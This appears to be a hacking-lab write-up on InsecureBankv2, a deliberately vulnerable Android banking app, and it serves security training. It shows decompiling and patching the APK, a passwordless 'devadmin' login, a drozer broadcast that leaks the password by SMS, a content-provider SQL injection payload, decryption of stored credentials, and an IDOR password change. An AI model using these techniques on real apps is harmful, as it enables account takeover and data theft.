# Hacking InsecureBankv2 App

## Analyze traffic using burp

1. Install Apk in the android emulator&#x20;
2.  Fire up burp suite and configure the proxy to listen to all interfaces on port 8081

    <figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>
3.  Configure proxy settings in the android emulator WIFI settings to be your localip:8081

    <figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>
4. Install Certificate to your emulator by exporting the burp certificate -> rename it to `burp.cer` -> push it to the emulator via `adb push <PATH>` then install it to your device
5. run app.py for your server and proxifiy traffic using burp and use all feature and collect all requests

## Pulling apk from devices

```bash
➜  ~ adb shell
vbox86p:/ # pm list packages | grep -i "insecurebank"
package:com.android.insecurebankv2
vbox86p:/ # pm path com.android.insecurebankv2
package:/data/app/com.android.insecurebankv2-PTvJEwmj-WzQHJux46vKZQ==/base.apk
vbox86p:/ # exit
➜  ~ cd Documents/Android\ AppSec/vulnApps/                        
➜  vulnApps adb pull /data/app/com.android.insecurebankv2-PTvJEwmj-WzQHJux46vKZQ==/base.apk
/data/app/com.android.insecurebankv2-P...d. 21.1 MB/s (3462429 bytes in 0.157s)
➜  vulnApps ls
6_3_SieveLoginBypass.zip  sieve_patched_no_crypto
base.apk                  sieve_patched_no_crypto.apk
```

## Decompiling application

```bash
# conver base.apk to base.jar
./d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk  
# using jadx cli or jadx-gui you can get the similar ava source code 
➜  ~ jadx base-dex2jar.jar
➜  ~ jadx-gui 
INFO  - output directory: base-dex2jar
INFO  - loading ...
INFO  - Loaded classes: 6529, methods: 40188, instructions: 1564986
INFO  - Resetting disk code cache, base dir: /home/sallam/.cache/jadx/projects/base-dex2jar-4b505a6f3e3bda1e1de8b834d5846214/code
# Using apktool decompiling the apk
➜  vulnApps apktool d base.apk 
I: Using Apktool 2.9.3 on base.apk
I: Loading resource table...
I: Decoding file-resources...
I: Loading resource table from file: /home/sallam/.local/share/apktool/framework/1.apk
I: Decoding values */* XMLs...
I: Decoding AndroidManifest.xml with resources...
I: Regular manifest package...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
➜  vulnApps ls
6_3_SieveLoginBypass.zip  base.apk          sieve_patched_no_crypto
base                      base-dex2jar.jar  sieve_patched_no_crypto.apk
```

* Analyze the code and android manifest.xml `subl base/AndroidManifest.xml`&#x20;
*   Use [drozer](https://github.com/WithSecureLabs/drozer) to give you an overview about the application [how to do it](https://www.udemy.com/course/the-complete-guide-to-android-bug-bounty-penetration-tests/learn/lecture/23034166#overview)\
    `run app.package.info -a com.android.insecurebankv2`\
    `run app.package.attacksurface com.android.insecurebannkv2`

    <figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>



## Previlige Escalation

* Fire up JADX and open up the `base.apk` file&#x20;
* Now you can see the source code and the apk data like the resources files
*   After searching for keywords like "admin" in the LoginActivity if ound this <br>

    <figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
* this guy using a boolean value from resources to hide some functionalities
*   Go to `res/values/stings.xml` and notice "**is\_admin**" is equal to no

    <figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
*   Now Using code editors like sublime change it to yes and save the project

    <figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
* Now Change the name of directory to&#x20;
*   Use APKTOOL  to build our updated version and use sign tool to sign the application

    ![](<../../.gitbook/assets/image (73).png>)
* And that's it you just remove the old version from phone and install your updated version instead
* the signed apk will be `insecurebankv2.s.apk`&#x20;
* Notice Now there is a functionality for registration added&#x20;

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

* Back to jadx in the DoLogin Activity i found this weird Code

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

The "devadmin" part in the `postData` method handles a specific case where the username is "devadmin." When the username is "devadmin," the method sends the login data to a different endpoint (`/devlogin`) rather than the standard login endpoint (`/login`). This could be used for developers or administrators who might need to authenticate through a different process or endpoint. Here’s a more detailed explanation focusing on this aspect:

1. **Check Username:**
   *   The method checks if the username is "devadmin":

       ```java
       javaCopy codeif (DoLogin.this.username.equals("devadmin")) {
       ```
2. **Send to `/devlogin` Endpoint:**
   *   If the username is "devadmin", it sets the entity (the body of the HTTP request) for `httppost2` (which points to the `/devlogin` URL) with the prepared login data and executes this post request:

       ```java
       javaCopy codehttppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
       responseBody = httpclient.execute(httppost2);
       ```
3. **Send to `/login` Endpoint:**
   *   If the username is not "devadmin", it sets the entity for `httppost` (which points to the standard `/login` URL) with the login data and executes this post request:

       ```java
       javaCopy codehttppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
       responseBody = httpclient.execute(httppost);

       ```

* So Login with username "**devadmin**" and **without password** will authenticate you as devadmin

## Analyze SqlLite Storage

* It is as easy as just go to the database directory of the package in the data directory&#x20;
* Then initialize sqlite and interact with it read tables and that stuff

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

```bash
1|vbox86p:/data/data/com.android.insecurebankv2/databases # ls
mydb mydb-journal 
vbox86p:/data/data/com.android.insecurebankv2/databases # sqlite3 mydb                                                                                
SQLite version 3.22.0 2018-12-19 01:30:22
Enter ".help" for usage hints.
sqlite> .tables 
android_metadata  names           
sqlite> select * from android_metadata;
en_US
sqlite> select * from names;
1|dinesh
2|dinesh
sqlite> 

```

## Insecure Logging&#x20;

* Android Logs Accessible by all applications so when app expose secrets or private information it is a bug !
* I Entered command `adb logcat`
* And tried to Login to Apllication and Voila!!
* The app Exposes plaint-text of the users

&#x20; &#x20;

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Exploit Broadcast Receivers

* Information Gathering

```bash
# Using drozer get the broadcast receivers informations
dz> run app.broadcast.info -a com.android.insecurebankv2 
Attempting to run shell module
Package: com.android.insecurebankv2
  com.android.insecurebankv2.MyBroadCastReceiver
    Permission: null
```

* Static Analysis `MyBroadCast` Activity

```java
package com.android.insecurebankv2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsManager;
import android.util.Base64;

/* JADX WARN: Classes with same name are omitted:
  /home/sallam/Documents/Android AppSec/vulnApps/InsecureBankv2/build/apk/classes.dex
 */
/* loaded from: /tmp/jadx-4403557323843835393.dex */
public class MyBroadCastReceiver extends BroadcastReceiver {
    public static final String MYPREFS = "mySharedPreferences";
    String usernameBase64ByteString;

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {
            try {
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
                String username = settings.getString("EncryptedUsername", null);
                byte[] usernameBase64Byte = Base64.decode(username, 0);
                this.usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
                String password = settings.getString("superSecurePassword", null);
                CryptoClass crypt = new CryptoClass();
                String decryptedPassword = crypt.aesDeccryptedString(password);
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
                smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
                return;
            } catch (Exception e) {
                e.printStackTrace();
                return;
            }
        }
        System.out.println("Phone number is null");
    }
}
```

This code defines a `BroadcastReceiver` that listens for specific intents containing a phone number and a new password. When triggered, it retrieves encrypted username and password from shared preferences, decrypts the password, and sends an SMS to the given phone number with a message about the password update. If the phone number is not provided, it logs that the phone number is null.

* Exploit send message tophone number 8888888 with new password

```bash
dz> run app.broadcast.send --action thBroadcast --extra string phonenummber 8888888 --extra string newpass Lol@88
```

<div align="center" data-full-width="true"><figure><img src="../../.gitbook/assets/image (79).png" alt="" width="145"><figcaption></figcaption></figure></div>

## Exploit Content Providers

* Find Provider URIs

```bash
dz> run app.provider.finduri com.android.insecurebankv2
Attempting to run shell module
Scanning com.android.insecurebankv2...
content://com.android.insecurebankv2.TrackUserContentProvider
content://com.google.android.gms.games
content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
content://com.android.insecurebankv2.TrackUserContentProvider/
content://com.google.android.gms.games/
content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

* Scan for Injection

```bash
dz> run scanner.provider.injection -a com.android.insecurebankv2
Attempting to run shell module
Scanning com.android.insecurebankv2...
Not Vulnerable:
  content://com.google.android.gms.games
  content://com.android.insecurebankv2.TrackUserContentProvider
  content://com.android.insecurebankv2.TrackUserContentProvider/
  content://com.google.android.gms.games/

Injection in Projection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

Injection in Selection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

```

* Exploit SQL Injection

```bash
dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection ""
Attempting to run shell module
Exception occured: near "FROM": syntax error (code 1 SQLITE_ERROR): , while compiling: SELECT  FROM names ORDER BY name
dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* from sqlite_master; --"
Attempting to run shell module
| type  | name             | tbl_name         | rootpage | sql                                                                            |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
| table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
```

* The Reason

```java
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
        qb.setTables(TABLE_NAME);
        switch (uriMatcher.match(uri)) {
            case 1:
                qb.setProjectionMap(values);
                if (sortOrder == null || sortOrder == "") {
                    sortOrder = name;
                }
                Cursor c = qb.query(this.db, projection, selection, selectionArgs, null, null, sortOrder);
                c.setNotificationUri(getContext().getContentResolver(), uri);
                return c;
            default:
                throw new IllegalArgumentException("Unknown URI " + uri);
        }
    }
```

Using `SQLiteQueryBuilder` without proper input validation can lead to SQL injection in content providers. If `selection`, `selectionArgs`, or `sortOrder` are directly used from untrusted sources (like user input) without sanitization, attackers can manipulate these parameters to execute arbitrary SQL commands, compromising the database.

## Weak Cryptography

* In shared preferences, logged-in user credentials are stored in an encrypted manner.

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

* You can decrypt it using online AES dycryption tools like [https://www.devglan.com/online-tools/aes-encryption-decryption#google\_vignette](https://www.devglan.com/online-tools/aes-encryption-decryption#google_vignette)

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

## IDOR to ATO

*   While Proxifying the trafiic with burp suite i Looked up some functions like change-password feature&#x20;

    <figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>
* I noticed the part that contains username but i cant edit the username on it&#x20;
* After sending acorrect request and the password successufully changed&#x20;

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

*   In burp the request was sple api request with parameters username and newpassword<br>

    <figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>
*   So I Edited the username parameter to another username and it worked i changed other user's password<br>

    <figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>
